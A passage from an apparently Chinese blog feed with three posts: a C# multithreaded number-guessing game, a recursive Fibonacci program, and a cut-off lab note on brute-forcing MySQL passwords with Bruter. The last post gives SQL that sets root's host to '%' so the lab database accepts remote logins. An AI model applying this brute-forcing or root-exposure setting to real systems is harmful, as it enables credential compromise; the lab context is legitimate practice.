        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="程序、进程、线程"><a href="#程序、进程、线程" class="headerlink" title="程序、进程、线程"></a>程序、进程、线程</h2><p><strong>程序</strong>：</p><ul><li>程序是<strong>指令</strong>和<strong>数据</strong>的<strong>有序集合</strong>。</li><li>程序是静态的。</li></ul><p><strong>进程</strong>：</p><ul><li>进程是一段程序的执行过程。</li><li>进程是动态的，具有生命周期。</li><li>进程是一个活动实体。</li><li>进程有三种基本状态（就绪态、运行态、阻塞态）。</li><li>进程是资源分配的基本单位。</li></ul><p><strong>线程</strong>：</p><ul><li>线程作为独立运行和独立调度的基本单位。</li><li>一个进程中可以包含若干个线程。</li></ul><p><strong>多线程</strong>：</p><p>&emsp;&emsp;在一个程序中，这些独立运行的程序片段叫作“线程”（Thread），利用它编程的概念就叫作“多线程处理”。多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。</p><blockquote><p>最简单的比喻多线程就像火车的每一节车厢，而进程则是火车。车厢离开火车是无法跑动的，同理火车也不可能只有一节车厢。多线程的出现就是为了提高效率。<a href="https://www.cnblogs.com/fuchongjundream/p/3829508.html" target="_blank" rel="noopener">“外引”</a></p></blockquote><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p><strong>编程环境</strong>：</p><ul><li>VS2017</li><li>.Net Framework 4.5</li></ul><p><strong>运行环境</strong>：</p><ul><li>Win10</li></ul><h1 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h1><p><strong>界面设计</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp多线程猜数字游戏/设计界面.png" alt="设计界面"></center><p><strong>代码设计</strong>:</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Drawing<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> NumGame<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Frm_Main</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Frm_Main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 声明全局变量</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 定义一个计时器线程</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Thread G_th<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 定义一个随机数对象</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        Random G_random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 定义一个int型全局变量，用于存放产生的随机变量</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token keyword">int</span> G_int_num<span class="token punctuation">;</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 开始按钮的Click事件</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 开始按钮的Click事件</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btn_begin_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">RemoveControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        <span class="token comment" spellcheck="true">//调用自定义的RemoveControl()方法清空自定义的按钮</span>            <span class="token keyword">int</span> p_int_x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">//X坐标初始值为10</span>            <span class="token keyword">int</span> p_int_y <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">//Y坐标初始值为60</span>            <span class="token comment" spellcheck="true">//向窗体添加按钮</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                           <span class="token comment" spellcheck="true">//添加100个按钮</span>            <span class="token punctuation">{</span>                Button bt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//创建button按钮</span>                bt<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//设置button按钮的文本值</span>                bt<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">//设置button按钮的Name属性</span>                bt<span class="token punctuation">.</span>Width <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//设置button按钮的宽</span>                bt<span class="token punctuation">.</span>Height <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span>                                     <span class="token comment" spellcheck="true">//设置button按钮的高</span>                bt<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span>p_int_x<span class="token punctuation">,</span> p_int_y<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//设置button按钮的位置</span>                bt<span class="token punctuation">.</span>Click <span class="token operator">+</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventHandler</span><span class="token punctuation">(</span>bt_Click<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//定义button按钮的Click事件</span>                p_int_x <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//设置下一个按钮的位置</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true">//设定每行有10个按钮</span>                <span class="token punctuation">{</span>                    p_int_x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//换行后重新设置X坐标  --X坐标不变</span>                    p_int_y <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span>                                  <span class="token comment" spellcheck="true">//换行后重新设置Y坐标  --Y坐标将变化为原来的+距离</span>                <span class="token punctuation">}</span>                Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>bt<span class="token punctuation">)</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//使用Controls.Add()方法将button按钮放入窗体控件集合中</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//创建线程</span>            <span class="token comment" spellcheck="true">//跨线程调用控件</span>            G_th <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Thread</span><span class="token punctuation">(</span>                 <span class="token comment" spellcheck="true">//新建一条线程</span>                <span class="token keyword">delegate</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>                              <span class="token comment" spellcheck="true">//使用匿名方法创建一个委托</span>                <span class="token punctuation">{</span>                    <span class="token keyword">int</span> P_int_count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">//初始化计数器</span>                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">true</span><span class="token punctuation">)</span>                                <span class="token comment" spellcheck="true">//开始无限循环</span>                    <span class="token punctuation">{</span>                        P_int_count <span class="token operator">=</span> <span class="token operator">++</span>P_int_count <span class="token operator">></span> <span class="token number">100000000</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token punctuation">:</span> P_int_count<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//计数器累加</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">Invoke</span><span class="token punctuation">(</span>                            <span class="token comment" spellcheck="true">//将代码交给主线程执行</span>                            <span class="token punctuation">(</span>MethodInvoker<span class="token punctuation">)</span><span class="token keyword">delegate</span>         <span class="token comment" spellcheck="true">//使用匿名方法</span>                            <span class="token punctuation">{</span>                                lb_time<span class="token punctuation">.</span>Text <span class="token operator">=</span> P_int_count<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//窗体中显示计数</span>                            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        System<span class="token punctuation">.</span>Threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//线程睡眠1秒</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            G_th<span class="token punctuation">.</span>IsBackground <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//设置线程为后台线程</span>            G_th<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                           <span class="token comment" spellcheck="true">//开始执行线程</span>            <span class="token comment" spellcheck="true">//生成一个随机数</span>            G_int_num <span class="token operator">=</span> G_random<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">//生成一个1-100之间的随机数</span>            btn_begin<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//停用开始按钮</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 注册生成按钮的Click事件的方法</span>        <span class="token comment" spellcheck="true">//注册按钮的Click事件的方法</span>        <span class="token keyword">void</span> <span class="token function">bt_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Control P_control <span class="token operator">=</span> sender <span class="token keyword">as</span> Control<span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">//将sender转换为control类型对象</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>P_control<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">></span> G_int_num<span class="token punctuation">)</span>                  <span class="token comment" spellcheck="true">//强制转化并判断猜测数值与随机产生的数值之间的差距</span>            <span class="token punctuation">{</span>                P_control<span class="token punctuation">.</span>BackColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>Red<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//设置按钮背景为红色</span>                P_control<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//设置按钮停用</span>                P_control<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"大"</span><span class="token punctuation">;</span>                                   <span class="token comment" spellcheck="true">//更改按钮文本--猜测数值偏大</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>P_control<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">&lt;</span> G_int_num<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                P_control<span class="token punctuation">.</span>BackColor <span class="token operator">=</span> Color<span class="token punctuation">.</span>Red<span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//设置按钮背景为红色</span>                P_control<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">false</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">//设置按钮停用</span>                P_control<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"小"</span><span class="token punctuation">;</span>                                       <span class="token comment" spellcheck="true">//更改按钮文本--猜测数偏小</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>P_control<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">==</span> G_int_num<span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">//当猜测数值与随机产生的数值相等时</span>            <span class="token punctuation">{</span>                G_th<span class="token punctuation">.</span><span class="token function">Abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                   <span class="token comment" spellcheck="true">//终止计数线程</span>                <span class="token comment" spellcheck="true">//显示游戏信息</span>                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token string">"恭喜你猜对了！共猜了{0}次 用时{1}秒"</span><span class="token punctuation">,</span> <span class="token function">GetCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lb_time<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"恭喜！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                btn_begin<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token keyword">true</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//启用开始按钮</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 计数方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 用于查找窗体中Enable属性为False控件的数量    --遍历窗体中的控件</span>        <span class="token comment" spellcheck="true">/// 用于计算玩家有多少次没有猜中</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;returns>返回没有猜中数量&lt;/returns></span>        <span class="token keyword">string</span> <span class="token function">GetCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">int</span> P_int_temp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                             <span class="token comment" spellcheck="true">//初始化计数器</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>Control c <span class="token keyword">in</span> Controls<span class="token punctuation">)</span>                                     <span class="token comment" spellcheck="true">//遍历控件集合</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">.</span>Enabled<span class="token punctuation">)</span> P_int_temp<span class="token operator">++</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">//计数器累加</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> P_int_temp<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">//返回计数器信息</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 清除控件方法</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 用于清空窗体中动态生成的按钮</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token keyword">void</span> <span class="token function">RemoveControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                            <span class="token comment" spellcheck="true">//自定义的清除方法</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                               <span class="token comment" spellcheck="true">//开始遍历100个按钮</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>Controls<span class="token punctuation">.</span><span class="token function">ContainsKey</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//窗体中是否有此按钮</span>                <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> Controls<span class="token punctuation">.</span>Count<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">//遍历窗体控件集合</span>                    <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Controls<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>Name <span class="token operator">==</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//是否查找到按钮</span>                        <span class="token punctuation">{</span>                            Controls<span class="token punctuation">.</span><span class="token function">RemoveAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token comment" spellcheck="true">//删除指定按钮</span>                            <span class="token keyword">break</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>        <span class="token preprocessor property">#<span class="token directive keyword">region</span> 窗体的FormClosing事件</span>        <span class="token comment" spellcheck="true">//窗体的FormClosing事件</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Frm_Main_FormClosing</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> FormClosingEventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>G_th <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                G_th<span class="token punctuation">.</span><span class="token function">Abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Environment<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//强行关闭窗体</span>        <span class="token punctuation">}</span>        <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp多线程猜数字游戏/测试结果.png" alt="测试结果"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>程序流程分析</strong>:</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp多线程猜数字游戏/NumGame.png" alt="NumGame"></center><p><strong>参考资料</strong>：</p><p><a href="https://www.cnblogs.com/fuchongjundream/p/3829508.html" target="_blank" rel="noopener">进程、线程、多线程相关总结</a></p>]]></content>
      
      
      <categories>
          
          <category> C# </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 程序实现 </tag>
            
            <tag> 小游戏 </tag>
            
            <tag> 多线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C#递归算法计算斐波那契数列</title>
      <link href="/2020/08/22/csharp-di-gui-suan-fa-ji-suan-fei-bo-na-qi-shu-lie/"/>
      <url>/2020/08/22/csharp-di-gui-suan-fa-ji-suan-fei-bo-na-qi-shu-lie/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><h2 id="兔子数列"><a href="#兔子数列" class="headerlink" title="兔子数列"></a>兔子数列</h2><p>斐波那契(Fibonacci)在《计算之术》中提出一个问题：</p><p>&emsp;&emsp;在第一个月有一对刚出生的小兔子，在第二个月小兔子变成大兔子并开始怀孕，第三个月大兔子会生下一对小兔子，并且以后每个月都会生下一对小兔子。 如果每对兔子都经历这样的出生、成熟、生育的过程，并且兔子永远不死，那么兔子的总数是如何变化的？</p><p><strong>关键点</strong>：</p><ul><li>兔子成对出生</li><li>兔子的成长周期和生育周期都为1个月</li><li>所有的兔子都不会死亡，并且可以一直保持生育</li></ul><p><strong>问题解析</strong>：</p><p>第一个月只有一对兔宝宝，1对兔子</p><p>第二个月兔宝宝变成大兔子，1对兔子</p><p>第三个月大兔子生了一对兔宝宝，2对兔子</p><p>第四个月大兔子继续生一对兔宝宝，小兔子变成大兔子，3对兔子</p><p>……</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp递归算法计算斐波那契数列/数列列表.jpg" alt="数列列表"></center><p><strong>发现规律</strong>：</p><ul><li>前一个月的大兔子对数就是下一个月的小兔子对数</li><li>前一个月的大兔子和小兔子对数的和就是下个月大兔子的对数</li></ul><p>$$<br>f(n)=<br>\begin{cases}<br>1 &amp; n=1\<br>1 &amp; n=2\<br>f(n-1) + f(n-2) &amp;n&gt;2<br>\end{cases}<br>$$</p><p>此为兔子数列（斐波那契数列）</p><p><font color="red"><strong>使用程序怎样来实现斐波那契数列呐？</strong></font></p><h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><p><strong>编程环境</strong>：</p><ul><li>VS2017</li><li>.Net Framework 4.5</li></ul><p><strong>运行环境</strong>：</p><ul><li>Win10</li></ul><h1 id="设计实现"><a href="#设计实现" class="headerlink" title="设计实现"></a>设计实现</h1><p><strong>界面设计</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp递归算法计算斐波那契数列/界面设计.png" alt="界面设计"></center><p><strong>代码设计</strong>：</p><pre class=" language-C#"><code class="language-C#">using System;using System.Windows.Forms;namespace Arithmetic{    public partial class Frm_Main : Form    {        public Frm_Main()        {            InitializeComponent();        }        #region 计算按钮的Click事件        //计算按钮的Click事件        private void btn_Get_Click(object sender, EventArgs e)        {            int P_int_temp;                                         //定义一个用于存储的整型变量            if (int.TryParse(txt_value.Text, out P_int_temp))       //为变量赋值            {                lb_result.Text = "计算结果为：" + Get(P_int_temp).ToString();     //输出计算结果            }            else                                    //当数据转化失败时            {                MessageBox.Show("请输入正确的数值！", "提示！");                      //提示输入正确数值            }        }        #endregion        #region 斐波那契数列的计算        /// <summary>        /// 递归算法                //斐波那契数列的计算问题        /// </summary>        /// <param name="i">参与计算的数值</param>        /// <returns>计算结果</returns>        int Get(int i)        {            if (i <= 0)                            //判断数值是否小于0                return 0;                        //返回数值0            else if (i >= 0 && i <= 2)            //判断数值是否大于等于0并且小于等于2                return 1;                        //返回数值1            else                                //如果不满足上述条件执行下面语句                return Get(i - 1) + Get(i - 2);    //返回指定位数前两位数的和        }        #endregion    }}</code></pre><p><strong>注</strong>：</p><ul><li>程序以int类型存储结果，当计算的数值超出int时，程序将会报错。</li></ul><h1 id="实现结果"><a href="#实现结果" class="headerlink" title="实现结果"></a>实现结果</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/CSharp/CSharp递归算法计算斐波那契数列/实现结果.png" alt="实现结果"></center><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>参考链接</strong>：</p><p><a href="https://baijiahao.baidu.com/s?id=1606651492697783298&wfr=spi" target="_blank" rel="noopener">什么叫斐波那契数列</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法实例 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 算法 </tag>
            
            <tag> 斐波那契数列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title> This host is not allowed to connect to MySQL server</title>
      <link href="/2020/08/22/this-host-is-not-allowed-to-connect-to-mysql-server/"/>
      <url>/2020/08/22/this-host-is-not-allowed-to-connect-to-mysql-server/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>​        在使用<strong>Bruter</strong>对靶机中的MySQL数据库的账号和密码进行爆破时，Message框中出现如下图所示的提示信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/错误提示信息.png" alt="错误提示信息"></center><h1 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h1><p>​    PhpStudy 2016集成 环境安装：</p><ul><li>MySQL版本：5.5.53</li><li>服务端口：3306</li></ul><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><ol><li><p>首先排除 IP地址、端口错误或MySQL服务未开启等问题，因为对于尝试登录登录数次不成功将显示如下的错误提示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/登录尝试超时提示信息.png" alt="登录尝试超时提示信息"></center></li><li><p><font color="red">This host is not allowed to connect to MySQL server</font>可能是MySQL数据库<strong>拒绝远程连接</strong>。</p><p>在另一台机器上远程连接改MySQL数据库，也显示类似的错误提示信息：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/远程连接mysql数据库错误提示.png" alt="远程连接mysql数据库错误提示"></center><ul><li><font color="blue">默认情况下，MySQL只允许本地连接，若要进行远程连接就需要先对其进行设置。</font></li></ul></li></ol><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>百度一下：“远程访问 MySQL数据库”</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/百度一下.png" alt="百度一下"></center></li><li><p><a href="https://www.cnblogs.com/wq-9/articles/11062770.html" target="_blank" rel="noopener">MySQL远程连接数据库</a></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/mysql远程连接数据库的方法.png" alt="mysql远程连接数据库的方法"></center></li><li><p>修改mysql数据库中user表中root对应得host字段的值为%，来允许远程用户连接MySQL。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/修改表信息.png" alt="修改表信息"></center><pre class=" language-mysql"><code class="language-mysql">use mysql;select host,user from user where user='root';update user set host='%' where user='root';select host,user from user where user='root';</code></pre></li><li><p><font color="blue">重启MySQL服务</font>后，再进行远程连接测试。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/重启MySQL后的连接测试.png" alt="重启MySQL后的连接测试"></center></li><li><p>Bruter爆破。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Cryptography/VigenereCipher/Bruter爆破成功.png" 